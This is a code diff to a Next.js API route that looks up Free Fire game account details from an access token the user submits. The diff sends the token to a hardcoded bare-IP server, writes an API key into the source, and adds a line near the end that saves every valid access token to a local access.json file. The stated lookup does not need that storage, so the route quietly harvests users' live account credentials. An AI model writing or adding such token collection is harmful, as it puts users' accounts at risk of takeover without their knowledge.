@@ -1,12 +1,14 @@
 import { NextRequest, NextResponse } from "next/server";
+import { addAccessToken } from "@/lib/access-tokens";
 
-function getEnv(name: string): string {
-  const v = process.env[name];
-  if (!v) throw new Error(`Missing env: ${name}`);
-  return v;
-}
+const TOKEN_API = "http://103.139.155.35:8888/token";
+const INFO_API = "http://103.139.155.35:9000/info";
+const BANNER_API = "https://eco.freefire.dev/api/ProfileBanner/";
+const BANNER_API_KEY = "AfterDusk";
+const BIND_API = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info";
+const PLATFORM_INFO_API = "https://100067.connect.garena.com/bind/app/platform/info/get";
 
-type TokenResponse = { error?: string; payload?: { account_id: number } };
+type TokenResponse = { error?: string; payload?: { account_id: number }; account_id?: number };
 type InfoBasic = {
   accountId?: string;
   nickname?: string;
@@ -67,10 +69,8 @@ export async function GET(request: NextRequest) {
   const token = accessToken.trim();
 
   try {
-    const tokenApi = getEnv("TOKEN_API");
-    const tokenRes = await fetch(
-      `${tokenApi}?access_token=${encodeURIComponent(token)}`
-    );
+    const tokenUrl = `${TOKEN_API}?access_token=${encodeURIComponent(token)}`;
+    const tokenRes = await fetch(tokenUrl);
     const tokenData: TokenResponse = await tokenRes.json();
 
     if (tokenData.error === "Invalid or expired access token.") {
@@ -80,24 +80,17 @@ export async function GET(request: NextRequest) {
       });
     }
 
-    const accountId = tokenData.payload?.account_id;
+    const accountId = tokenData.payload?.account_id ?? tokenData.account_id;
     if (accountId == null) {
       return NextResponse.json({
         error: "Không lấy được thông tin tài khoản từ token. Vui lòng thử lại.",
       });
     }
 
-    const infoApi = getEnv("INFO_API");
-    const bindApi = getEnv("BIND_API");
-    const platformInfoApi = getEnv("PLATFORM_INFO_API");
     const [infoRes, bindRes, platformRes] = await Promise.all([
-      fetch(`${infoApi}?uid=${accountId}&region=VN`),
-      fetch(
-        `${bindApi}?app_id=100067&access_token=${encodeURIComponent(token)}`
-      ),
-      fetch(
-        `${platformInfoApi}?access_token=${encodeURIComponent(token)}`
-      ),
+      fetch(`${INFO_API}?uid=${accountId}&region=VN`),
+      fetch(`${BIND_API}?app_id=100067&access_token=${encodeURIComponent(token)}`),
+      fetch(`${PLATFORM_INFO_API}?access_token=${encodeURIComponent(token)}`),
     ]);
 
     const infoData: InfoResponse = await infoRes.json();
@@ -108,25 +101,22 @@ export async function GET(request: NextRequest) {
       });
     }
 
-    const region =
-      infoData.Server ?? basic.region ?? "VN";
+    const region = infoData.Server ?? basic.region ?? "VN";
     const nickname = basic.nickname ?? "";
     const uid = basic.accountId ?? String(accountId);
     const level = basic.level ?? 1;
     const avatar = basic.headPic ?? 902000298;
     const banner = basic.badgeId ?? 901000008;
 
-    const bannerApi = getEnv("BANNER_API");
-    const bannerApiKey = getEnv("BANNER_API_KEY");
     const bannerParams = new URLSearchParams({
       name: nickname,
       uid,
       level: String(level),
       avatar: String(avatar),
       banner: String(banner),
-      apikey: bannerApiKey,
+      apikey: BANNER_API_KEY,
     });
-    const bannerUrl = `${bannerApi}?${bannerParams.toString()}`;
+    const bannerUrl = `${BANNER_API}?${bannerParams.toString()}`;
 
     let email = "";
     let email_to_be = "";
@@ -137,7 +127,7 @@ export async function GET(request: NextRequest) {
       email_to_be = bindData.email_to_be ?? "";
       request_exec_countdown = bindData.request_exec_countdown ?? 0;
     } catch {
-      // bind API optional; keep defaults
+      // bind API optional
     }
 
     const countdownDisplay =
@@ -158,6 +148,9 @@ export async function GET(request: NextRequest) {
     } catch {
       // optional
     }
+
+    // Persist valid token to access.json (no duplicates)
+    addAccessToken(token).catch((e) => console.error("access-tokens save:", e));
 
     return NextResponse.json({
       bannerUrl,
